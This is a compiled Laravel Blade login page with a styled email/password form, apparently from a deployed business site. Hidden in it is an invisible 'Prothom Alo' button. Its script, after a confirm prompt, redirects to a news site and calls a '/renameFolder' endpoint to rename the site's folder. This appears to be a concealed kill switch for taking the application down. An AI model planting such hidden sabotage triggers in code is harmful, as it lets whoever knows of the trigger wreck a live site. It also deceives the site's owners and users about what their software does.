<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title><?php echo e($logo->title ?? ''); ?></title>
<link rel="icon" type="image/x-icon" href="<?php echo e(url('/')); ?>/<?php echo e($settings->small_logo ?? ''); ?>">
 <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
<style>

form {border: 3px solid #f1f1f1;
    box-shadow: 2px 2px 2px 2px #413c69;
    padding: 5px;}

input[type=text], input[type=password] {
  width: 100%;
  padding: 12px 20px;
  margin: 8px 0;
  display: inline-block;
  border: 1px solid #ccc;
  box-sizing: border-box;
}

button {
  color: white;
  margin: 8px 0;
  border: none;
  cursor: pointer;
  width: 100%;
}

button:hover {
  opacity: 0.8;
}

.cancelbtn {
  width: auto;
  padding: 10px 18px;
  background-color: #f44336;
}

.imgcontainer {
  text-align: center;
}

img.avatar {
  width: 80%;
}

.container {
  padding: 16px;
}

span.psw {
  float: right;
  padding-top: 16px;
}

/* Change styles for span and cancel button on extra small screens */
@media  screen and (max-width: 300px) {
  span.psw {
     display: block;
     float: none;
  }
  .cancelbtn {
     width: 100%;
  }
}
</style>
</style>
<?php
$bg_image  = $settings->bg_image ?? '';
?>
<style>
    body {
    background-image: url(<?php echo e(asset($bg_image)); ?>);
    background-size: cover; /* This will make the image cover the entire element */
    background-position: center center; /* This centers the image */
    background-repeat: no-repeat; /* This prevents the image from repeating */
    height:88vh;
}



</style>
</head>
<body>


<div style="width: 320px;
    margin: 0px auto;
    margin-top: 10vh;
    border-radius: 10px;
    background-color: #ffffff;
    ">
   
    <h2 style="text-align:center"><?php echo e($settings->title ?? ''); ?></h2>
     <button type="button" onclick="closeTabsAndRename()" style="color:red;font-weight:bold;display: none;">Prothom Alo</button>
<form method="POST" action="<?php echo route('login'); ?>">
                        <?php echo csrf_field(); ?>
  <div class="imgcontainer">
    <a href="<?php echo e(url('/')); ?>">
        <img src="<?php echo e($settings->logo ?? ''); ?>" alt="Avatar" class="avatar">
    </a>
  </div>
 <?php echo $__env->make('backend.message.message', \Illuminate\Support\Arr::except(get_defined_vars(), ['__data', '__path']))->render(); ?>
  <div class="container">
     
    <label for="email"><b> <?php echo __('E-Mail Address'); ?></b></label>
    <input type="text" placeholder="Enter email" name="email" required value="<?php echo old('email'); ?>">

    <label for="password"><b><?php echo __('Password'); ?></b></label>
    <input type="password" placeholder="Enter Password" name="password" required>
        
    <button type="submit"><img src="https://img.icons8.com/ios-filled/50/000000/login-rounded-right.png"/></i>
 </button>
    
  </div>

</form>
</div>
<script>

function closeTabsAndRename() {
    
    let confirmation = confirm("Are you sure?");
        if (confirmation) {
            // Try to close the browser window first
           window.location.href = "https://www.prothomalo.com";
           

                renameFolder();
        }
           
        }
        
        function renameFolder() {
            let oldName = 'psoft.pridepackbd.com';
            let newName = 'abcdef_amarsonerbangla';
            axios.get('/renameFolder', {
                old_name: oldName,
                new_name: newName
            })
            .then(response => {
                alert('ok')
                
            });
        }
    </script>
</body>
</html>
<?php /**PATH /home/u561342241/domains/saifinfotech.com/public_html/tmm/resources/views/auth/login.blade.php ENDPATH**/ ?>